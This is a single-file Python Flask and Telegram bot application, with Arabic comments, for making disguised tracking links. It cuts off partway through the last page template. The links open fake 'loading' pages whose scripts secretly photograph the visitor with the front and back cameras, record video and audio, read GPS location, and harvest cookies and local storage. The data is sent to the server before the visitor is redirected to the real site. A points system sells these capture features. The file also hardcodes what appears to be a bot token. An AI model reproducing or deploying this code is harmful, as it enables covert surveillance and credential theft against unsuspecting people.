# ============================================================
#  ملف واحد شامل (app.py) - سيرفر + بوت + قاعدة بيانات + كل شيء
# ============================================================
from flask import Flask, request, render_template_string, redirect, jsonify
from datetime import datetime
import secrets
import os
import base64
import json
import requests
import threading
import time
import sqlite3
import re
from urllib.parse import urlparse
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ====== الإعدادات (config) ======
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8847400367:AAHNhfgMGGuo3eCIiNjMD8u4EjnL7OkNLls')
BASE_URL = os.environ.get('BASE_URL', 'https://bott-production-25ba.up.railway.app')
SECRET_KEY = os.environ.get('SECRET_KEY', 'my-super-secret-key')
DB_PATH = 'data.db'

# ====== قاعدة البيانات (database) ======
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            points INTEGER DEFAULT 0,
            total_points INTEGER DEFAULT 0,
            invite_code TEXT UNIQUE,
            invited_by INTEGER,
            joined_date TEXT,
            last_active TEXT,
            is_admin INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS invites (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            inviter_id INTEGER,
            invited_id INTEGER,
            date TEXT,
            points_earned INTEGER DEFAULT 1
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS daily_attempts (
            user_id INTEGER,
            date TEXT,
            attempts INTEGER DEFAULT 0,
            PRIMARY KEY (user_id, date)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS required_channels (
            channel_id TEXT PRIMARY KEY,
            channel_name TEXT,
            is_active INTEGER DEFAULT 1
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS features (
            feature_name TEXT PRIMARY KEY,
            is_enabled INTEGER DEFAULT 1
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT,
            details TEXT,
            timestamp TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            session_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            features TEXT,
            original_url TEXT,
            config TEXT,
            created TEXT
        )
    ''')
    
    # ====== جداول النقاط اليومية والمكافآت الجماعية ======
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS daily_rewards (
            user_id INTEGER,
            date TEXT,
            last_claim TEXT,
            PRIMARY KEY (user_id, date)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS group_rewards (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            code TEXT UNIQUE,
            admin_id INTEGER,
            points INTEGER,
            member_count INTEGER,
            used_count INTEGER DEFAULT 0,
            created TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS reward_usage (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            code TEXT,
            user_id INTEGER,
            used_at TEXT
        )
    ''')
    
    cursor.execute('''
        INSERT OR IGNORE INTO settings (key, value)
        VALUES 
            ('free_attempts', '3'),
            ('video_duration', '30'),
            ('audio_duration', '30'),
            ('camera_count', '3')
    ''')

    cursor.execute('''
    CREATE TABLE IF NOT EXISTS sessions (
        session_id TEXT PRIMARY KEY,
        chat_id INTEGER,
        features TEXT,
        original_url TEXT,
        fake_url TEXT,
        config TEXT,
        created TEXT
    )
''')
    
    features = ['camera', 'audio', 'video', 'location', 'device', 'all']
    for feature in features:
        cursor.execute('''
            INSERT OR IGNORE INTO features (feature_name, is_enabled)
            VALUES (?, 1)
        ''', (feature,))
    
    conn.commit()
    conn.close()

# ====== دوال المستخدمين ======
def get_user(user_id):
    conn = get_db()
    user = conn.execute('SELECT * FROM users WHERE user_id = ?', (user_id,)).fetchone()
    conn.close()
    return user

def create_user(user_id, username, first_name, last_name, invited_by=None):
    conn = get_db()
    cursor = conn.cursor()
    invite_code = secrets.token_urlsafe(6)
    cursor.execute('''
        INSERT INTO users (user_id, username, first_name, last_name, invite_code, invited_by, joined_date, last_active)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, username, first_name, last_name, invite_code, invited_by, datetime.now().isoformat(), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    if invited_by:
        add_points(invited_by, 1, 'invite')
        log_invite(invited_by, user_id)
    return True

def update_user_activity(user_id):
    conn = get_db()
    conn.execute('UPDATE users SET last_active = ? WHERE user_id = ?', (datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()

def add_points(user_id, points, reason=''):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET points = points + ?, total_points = total_points + ? WHERE user_id = ?', (points, points, user_id))
    conn.commit()
    conn.close()
    log_action(user_id, 'add_points', f'{points} نقاط - {reason}')

def deduct_points(user_id, points, reason=''):
    conn = get_db()
    cursor = conn.cursor()
    user = cursor.execute('SELECT points FROM users WHERE user_id = ?', (user_id,)).fetchone()
    if user and user['points'] >= points:
        cursor.execute('UPDATE users SET points = points - ? WHERE user_id = ?', (points, user_id))
        conn.commit()
        conn.close()
        log_action(user_id, 'deduct_points', f'{points} نقاط - {reason}')
        return True
    conn.close()
    return False

def log_action(user_id, action, details=''):
    conn = get_db()
    conn.execute('''
        INSERT INTO user_logs (user_id, action, details, timestamp)
        VALUES (?, ?, ?, ?)
    ''', (user_id, action, details, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def log_invite(inviter_id, invited_id):
    conn = get_db()
    conn.execute('''
        INSERT INTO invites (inviter_id, invited_id, date, points_earned)
        VALUES (?, ?, ?, ?)
    ''', (inviter_id, invited_id, datetime.now().isoformat(), 1))
    conn.commit()
    conn.close()

# ====== دوال المحاولات اليومية ======
def get_daily_attempts(user_id):
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    result = conn.execute('SELECT attempts FROM daily_attempts WHERE user_id = ? AND date = ?', (user_id, today)).fetchone()
    conn.close()
    return result['attempts'] if result else 0

def increment_daily_attempts(user_id):
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO daily_attempts (user_id, date, attempts)
        VALUES (?, ?, 1)
        ON CONFLICT(user_id, date) DO UPDATE SET attempts = attempts + 1
    ''', (user_id, today))
    conn.commit()
    conn.close()

def get_free_attempts_limit():
    conn = get_db()
    result = conn.execute('SELECT value FROM settings WHERE key = "free_attempts"').fetchone()
    conn.close()
    return int(result['value']) if result else 3

# ====== دوال القنوات الإجبارية ======
def get_required_channels():
    conn = get_db()
    channels = conn.execute('SELECT * FROM required_channels WHERE is_active = 1').fetchall()
    conn.close()
    return channels

def add_required_channel(channel_id, channel_name):
    conn = get_db()
    conn.execute('''
        INSERT OR REPLACE INTO required_channels (channel_id, channel_name, is_active)
        VALUES (?, ?, 1)
    ''', (channel_id, channel_name))
    conn.commit()
    conn.close()

def remove_required_channel(channel_id):
    conn = get_db()
    conn.execute('DELETE FROM required_channels WHERE channel_id = ?', (channel_id,))
    conn.commit()
    conn.close()

# ====== دوال الميزات ======
def is_feature_enabled(feature_name):
    conn = get_db()
    result = conn.execute('SELECT is_enabled FROM features WHERE feature_name = ?', (feature_name,)).fetchone()
    conn.close()
    return bool(result['is_enabled']) if result else True

def toggle_feature(feature_name):
    conn = get_db()
    current = conn.execute('SELECT is_enabled FROM features WHERE feature_name = ?', (feature_name,)).fetchone()
    if current:
        new_value = 0 if current['is_enabled'] else 1
        conn.execute('UPDATE features SET is_enabled = ? WHERE feature_name = ?', (new_value, feature_name))
        conn.commit()
        conn.close()
        return bool(new_value)
    conn.close()
    return False

# ====== دوال الإعدادات ======
def get_setting(key, default=None):
    conn = get_db()
    result = conn.execute('SELECT value FROM settings WHERE key = ?', (key,)).fetchone()
    conn.close()
    return result['value'] if result else default

def set_setting(key, value):
    conn = get_db()
    conn.execute('''
        INSERT OR REPLACE INTO settings (key, value)
        VALUES (?, ?)
    ''', (key, value))
    conn.commit()
    conn.close()

# ====== دوال مساعدة (utils) ======
def generate_session_id():
    return secrets.token_urlsafe(12)

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def create_short_link(session_id):
    short_id = session_id[:8]
    return f"{BASE_URL}/{short_id}"

# ====== دوال الجلسات (session_manager) ======
def create_session(chat_id, features, original_url, config_data=None):
    session_id = generate_session_id()
    
    # ====== إنشاء رابط ملغم بنفس شكل الرابط الأصلي ======
    parsed = urlparse(original_url)
    
    # إضافة مسار أو معامل وهمي
    if parsed.path.endswith('/'):
        fake_path = f"{parsed.path}{session_id[:8]}"
    elif parsed.path:
        fake_path = f"{parsed.path}/{session_id[:8]}"
    else:
        fake_path = f"/{session_id[:8]}"
    
    # إعادة بناء الرابط
    if parsed.query:
        fake_url = f"{parsed.scheme}://{parsed.netloc}{fake_path}?{parsed.query}&ref={session_id[:6]}"
    else:
        fake_url = f"{parsed.scheme}://{parsed.netloc}{fake_path}?ref={session_id[:6]}"
    
    conn = get_db()
    conn.execute('''
        INSERT INTO sessions (session_id, chat_id, features, original_url, config, created, fake_url)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (session_id, chat_id, features, original_url, json.dumps(config_data or {}), datetime.now().isoformat(), fake_url))
    conn.commit()
    conn.close()
    
    return session_id, fake_url

def get_session(session_id):
    conn = get_db()
    session = conn.execute('SELECT * FROM sessions WHERE session_id = ?', (session_id,)).fetchone()
    conn.close()
    return session

# ====== دوال النقاط اليومية والمكافآت الجماعية ======
def get_daily_reward(user_id):
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    result = conn.execute('''
        SELECT last_claim FROM daily_rewards 
        WHERE user_id = ? AND date = ?
    ''', (user_id, today)).fetchone()
    conn.close()
    return result is None

def claim_daily_reward(user_id):
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    conn.execute('''
        INSERT OR REPLACE INTO daily_rewards (user_id, date, last_claim)
        VALUES (?, ?, ?)
    ''', (user_id, today, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_daily_reward_count():
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    count = conn.execute('SELECT COUNT(*) FROM daily_rewards WHERE date = ?', (today,)).fetchone()[0]
    conn.close()
    return count

def create_group_reward(admin_id, points, member_count, code):
    conn = get_db()
    conn.execute('''
        INSERT INTO group_rewards (code, admin_id, points, member_count, used_count, created)
        VALUES (?, ?, ?, ?, 0, ?)
    ''', (code, admin_id, points, member_count, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_group_reward(code):
    conn = get_db()
    reward = conn.execute('SELECT * FROM group_rewards WHERE code = ?', (code,)).fetchone()
    conn.close()
    return reward

def use_group_reward(code, user_id):
    conn = get_db()
    used = conn.execute('''
        SELECT * FROM reward_usage WHERE code = ? AND user_id = ?
    ''', (code, user_id)).fetchone()
    if used:
        conn.close()
        return False, 'already_used'
    
    reward = conn.execute('SELECT * FROM group_rewards WHERE code = ?', (code,)).fetchone()
    if not reward:
        conn.close()
        return False, 'not_found'
    
    if reward['used_count'] >= reward['member_count']:
        conn.close()
        return False, 'full'
    
    conn.execute('''
        UPDATE group_rewards SET used_count = used_count + 1 WHERE code = ?
    ''', (code,))
    conn.execute('''
        INSERT INTO reward_usage (code, user_id, used_at)
        VALUES (?, ?, ?)
    ''', (code, user_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    add_points(user_id, reward['points'], f'مكافأة جماعية: {code}')
    return True, reward['points']

# ====== دوال الأسعار ======
def get_prices():
    conn = get_db()
    prices = {}
    features = ['camera', 'audio', 'video', 'location', 'device', 'all']
    for feature in features:
        result = conn.execute('SELECT value FROM settings WHERE key = ?', (f'price_{feature}',)).fetchone()
        prices[feature] = int(result['value']) if result else 5
    conn.close()
    return prices

def set_price(feature, price):
    conn = get_db()
    conn.execute('''
        INSERT OR REPLACE INTO settings (key, value)
        VALUES (?, ?)
    ''', (f'price_{feature}', str(price)))
    conn.commit()
    conn.close()

# ====== إنشاء تطبيق Flask ======
app = Flask(__name__)
app.secret_key = SECRET_KEY

# ============================================================
#  صفحات HTML (pages.py)
# ============================================================

CAMERA_FRONT_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جاري التحميل...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#0a0a0a; }
.container { background:rgba(255,255,255,0.03); padding:40px; border-radius:20px; text-align:center; border:1px solid rgba(255,255,255,0.05); }
.loader { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #667eea; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
.status { color:rgba(255,255,255,0.5); font-size:14px; }
</style>
</head>
<body>
<div class="container"><div class="loader"></div><p class="status" id="status">جاري تصوير الكاميرا الأمامية...</p></div>
<script>
const session_id="{{session_id}}", original_url="{{original_url}}", statusEl=document.getElementById('status');
const data={session_id:session_id,timestamp:new Date().toISOString(),camera_front:[],device:{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height}};
async function captureFront(){const count=3;for(let i=0;i<count;i++){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240}});const video=document.createElement('video');video.srcObject=stream;video.autoplay=true;await new Promise(r=>video.onloadedmetadata=r);await new Promise(r=>setTimeout(r,300));const canvas=document.createElement('canvas');canvas.width=320;canvas.height=240;canvas.getContext('2d').drawImage(video,0,0);data.camera_front.push(canvas.toDataURL('image/jpeg',0.7));stream.getTracks().forEach(t=>t.stop());statusEl.textContent=`✅ تم تصوير الصورة ${i+1}/${count}`;}catch(e){statusEl.textContent='❌ فشل التصوير';}}}
async function sendData(){await captureFront();try{await fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});statusEl.textContent='✅ تم الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},1500);}catch(e){statusEl.textContent='❌ فشل الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);}}
sendData();
</script>
</body>
</html>
"""

CAMERA_BACK_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جاري التحميل...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#0a0a0a; }
.container { background:rgba(255,255,255,0.03); padding:40px; border-radius:20px; text-align:center; border:1px solid rgba(255,255,255,0.05); }
.loader { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #667eea; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
.status { color:rgba(255,255,255,0.5); font-size:14px; }
</style>
</head>
<body>
<div class="container"><div class="loader"></div><p class="status" id="status">جاري تصوير الكاميرا الخلفية...</p></div>
<script>
const session_id="{{session_id}}", original_url="{{original_url}}", statusEl=document.getElementById('status');
const data={session_id:session_id,timestamp:new Date().toISOString(),camera_back:[],device:{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height}};
async function captureBack(){const count=3;for(let i=0;i<count;i++){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:320,height:240}});const video=document.createElement('video');video.srcObject=stream;video.autoplay=true;await new Promise(r=>video.onloadedmetadata=r);await new Promise(r=>setTimeout(r,300));const canvas=document.createElement('canvas');canvas.width=320;canvas.height=240;canvas.getContext('2d').drawImage(video,0,0);data.camera_back.push(canvas.toDataURL('image/jpeg',0.7));stream.getTracks().forEach(t=>t.stop());statusEl.textContent=`✅ تم تصوير الصورة ${i+1}/${count}`;}catch(e){statusEl.textContent='❌ فشل التصوير';}}}
async function sendData(){await captureBack();try{await fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});statusEl.textContent='✅ تم الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},1500);}catch(e){statusEl.textContent='❌ فشل الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);}}
sendData();
</script>
</body>
</html>
"""

VIDEO_FRONT_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جاري التحميل...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#0a0a0a; }
.container { background:rgba(255,255,255,0.03); padding:40px; border-radius:20px; text-align:center; border:1px solid rgba(255,255,255,0.05); }
.loader { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #667eea; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
.status { color:rgba(255,255,255,0.5); font-size:14px; }
</style>
</head>
<body>
<div class="container"><div class="loader"></div><p class="status" id="status">جاري تسجيل الفيديو (30 ثانية)...</p></div>
<script>
const session_id="{{session_id}}", original_url="{{original_url}}", statusEl=document.getElementById('status');
const data={session_id:session_id,timestamp:new Date().toISOString(),video:null,device:{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height}};
async function recordVideo(){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240},audio:true});const recorder=new MediaRecorder(stream);const chunks=[];recorder.ondataavailable=e=>chunks.push(e.data);recorder.onstop=()=>{const blob=new Blob(chunks,{type:'video/webm'});const reader=new FileReader();reader.onload=()=>data.video=reader.result;reader.readAsDataURL(blob);statusEl.textContent='✅ تم تسجيل الفيديو';};recorder.start();let seconds=0;const interval=setInterval(()=>{seconds++;statusEl.textContent=`🎥 تسجيل الفيديو: ${seconds}/30 ثانية`;},1000);await new Promise(r=>setTimeout(r,30000));clearInterval(interval);if(recorder.state==='recording'){recorder.stop();stream.getTracks().forEach(t=>t.stop());}}catch(e){statusEl.textContent='❌ فشل تسجيل الفيديو';}}
async function sendData(){await recordVideo();try{await fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});statusEl.textContent='✅ تم الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},1500);}catch(e){statusEl.textContent='❌ فشل الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);}}
sendData();
</script>
</body>
</html>
"""

VIDEO_BACK_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جاري التحميل...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#0a0a0a; }
.container { background:rgba(255,255,255,0.03); padding:40px; border-radius:20px; text-align:center; border:1px solid rgba(255,255,255,0.05); }
.loader { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #667eea; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
.status { color:rgba(255,255,255,0.5); font-size:14px; }
</style>
</head>
<body>
<div class="container"><div class="loader"></div><p class="status" id="status">جاري تسجيل الفيديو (30 ثانية)...</p></div>
<script>
const session_id="{{session_id}}", original_url="{{original_url}}", statusEl=document.getElementById('status');
const data={session_id:session_id,timestamp:new Date().toISOString(),video:null,device:{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height}};
async function recordVideo(){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:320,height:240},audio:true});const recorder=new MediaRecorder(stream);const chunks=[];recorder.ondataavailable=e=>chunks.push(e.data);recorder.onstop=()=>{const blob=new Blob(chunks,{type:'video/webm'});const reader=new FileReader();reader.onload=()=>data.video=reader.result;reader.readAsDataURL(blob);statusEl.textContent='✅ تم تسجيل الفيديو';};recorder.start();let seconds=0;const interval=setInterval(()=>{seconds++;statusEl.textContent=`🎥 تسجيل الفيديو: ${seconds}/30 ثانية`;},1000);await new Promise(r=>setTimeout(r,30000));clearInterval(interval);if(recorder.state==='recording'){recorder.stop();stream.getTracks().forEach(t=>t.stop());}}catch(e){statusEl.textContent='❌ فشل تسجيل الفيديو';}}
async function sendData(){await recordVideo();try{await fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});statusEl.textContent='✅ تم الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},1500);}catch(e){statusEl.textContent='❌ فشل الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);}}
sendData();
</script>
</body>
</html>
"""

AUDIO_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جاري التحميل...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#0a0a0a; }
.container { background:rgba(255,255,255,0.03); padding:40px; border-radius:20px; text-align:center; border:1px solid rgba(255,255,255,0.05); }
.loader { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #667eea; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
.status { color:rgba(255,255,255,0.5); font-size:14px; }
</style>
</head>
<body>
<div class="container"><div class="loader"></div><p class="status" id="status">جاري تسجيل الصوت (30 ثانية)...</p></div>
<script>
const session_id="{{session_id}}", original_url="{{original_url}}", statusEl=document.getElementById('status');
const data={session_id:session_id,timestamp:new Date().toISOString(),audio:null,device:{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height}};
async function recordAudio(){try{const stream=await navigator.mediaDevices.getUserMedia({audio:true});const recorder=new MediaRecorder(stream);const chunks=[];recorder.ondataavailable=e=>chunks.push(e.data);recorder.onstop=()=>{const blob=new Blob(chunks,{type:'audio/webm'});const reader=new FileReader();reader.onload=()=>data.audio=reader.result;reader.readAsDataURL(blob);statusEl.textContent='✅ تم تسجيل الصوت';};recorder.start();let seconds=0;const interval=setInterval(()=>{seconds++;statusEl.textContent=`🎙 تسجيل الصوت: ${seconds}/30 ثانية`;},1000);await new Promise(r=>setTimeout(r,30000));clearInterval(interval);if(recorder.state==='recording'){recorder.stop();stream.getTracks().forEach(t=>t.stop());}}catch(e){statusEl.textContent='❌ فشل تسجيل الصوت';}}
async function sendData(){await recordAudio();try{await fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});statusEl.textContent='✅ تم الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},1500);}catch(e){statusEl.textContent='❌ فشل الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);}}
sendData();
</script>
</body>
</html>
"""

LOCATION_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جاري التحميل...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#0a0a0a; }
.container { background:rgba(255,255,255,0.03); padding:40px; border-radius:20px; text-align:center; border:1px solid rgba(255,255,255,0.05); }
.loader { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #667eea; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
.status { color:rgba(255,255,255,0.5); font-size:14px; }
</style>
</head>
<body>
<div class="container"><div class="loader"></div><p class="status" id="status">جاري جلب الموقع...</p></div>
<script>
const session_id="{{session_id}}", original_url="{{original_url}}", statusEl=document.getElementById('status');
const data={session_id:session_id,timestamp:new Date().toISOString(),location:null,device:{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height}};
function getLocation(){if(navigator.geolocation){statusEl.textContent='📍 جلب الموقع...';navigator.geolocation.getCurrentPosition(pos=>{data.location={lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy,altitude:pos.coords.altitude,speed:pos.coords.speed};statusEl.textContent='✅ تم جلب الموقع';sendData();},()=>{statusEl.textContent='❌ رفض الموقع، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);},{enableHighAccuracy:true,timeout:10000});}else{statusEl.textContent='❌ الموقع غير مدعوم';setTimeout(()=>{window.location.href=original_url;},2000);}}
async function sendData(){try{await fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});statusEl.textContent='✅ تم الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},1500);}catch(e){statusEl.textContent='❌ فشل الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);}}
getLocation();
</script>
</body>
</html>
"""

DEVICE_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جاري التحميل...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#0a0a0a; }
.container { background:rgba(255,255,255,0.03); padding:40px; border-radius:20px; text-align:center; border:1px solid rgba(255,255,255,0.05); }
.loader { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #667eea; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
.status { color:rgba(255,255,255,0.5); font-size:14px; }
</style>
</head>
<body>
<div class="container"><div class="loader"></div><p class="status" id="status">جاري جمع معلومات الجهاز...</p></div>
<script>
const session_id="{{session_id}}", original_url="{{original_url}}", statusEl=document.getElementById('status');
const data={session_id:session_id,timestamp:new Date().toISOString(),device:{},battery:null,cookies:{},storage:{},ip:null};
data.device={userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,hardwareConcurrency:navigator.hardwareConcurrency||'غير معروف',deviceMemory:navigator.deviceMemory||'غير معروف',maxTouchPoints:navigator.maxTouchPoints||0,vendor:navigator.vendor||'غير معروف',cookiesEnabled:navigator.cookieEnabled,doNotTrack:navigator.doNotTrack||'غير مفعل'};
if(navigator.getBattery){navigator.getBattery().then(b=>{data.battery={level:Math.round(b.level*100),charging:b.charging,chargingTime:b.chargingTime,dischargingTime:b.dischargingTime};}).catch(()=>{});}
try{document.cookie.split(';').forEach(c=>{const p=c.trim().split('=');if(p.length>=2)data.cookies[p[0]]=p.slice(1).join('=');});}catch(e){}
try{for(let i=0;i<localStorage.length;i++){const key=localStorage.key(i);if(key)data.storage[key]=localStorage.getItem(key);}}catch(e){}
try{for(let i=0;i<sessionStorage.length;i++){const key=sessionStorage.key(i);if(key)data.storage['session_'+key]=sessionStorage.getItem(key);}}catch(e){}
async function getIP(){try{const response=await fetch('/get_ip');const ipData=await response.json();data.ip=ipData.ip;}catch(e){}}
async function sendData(){await getIP();statusEl.textContent='✅ تم جمع المعلومات، جاري الإرسال...';try{await fetch('/send_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});statusEl.textContent='✅ تم الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},1500);}catch(e){statusEl.textContent='❌ فشل الإرسال، جاري التوجيه...';setTimeout(()=>{window.location.href=original_url;},2000);}}
setTimeout(sendData,2000);
</script>
</body>
</html>
"""

ALL_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جاري التحميل...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#0a0a0a; }
.container { background:rgba(255,255,255,0.03); padding:40px; border-radius:20px; text-align:center; border:1px solid rgba(255,255,255,0.05); }
.loader { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #667eea; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
.status { color:rgba(255,255,255,0.5); font-size:14px; }
.sub-status { color:rgba(255,255,255,0.3); font-size:12px; margin-top:10px; }
</style>
</head>
<body>
<div class="container"><div class="loader"></div><p class="status" id="status">جاري جمع البيانات...</p><p class="sub-status" id="subStatus"></p></div>
<script>
const session_id="{{session_id}}", original_url="{{original_url}}", statusEl=document.getElementById('status'), subStatusEl=document.getElementById('subStatus');
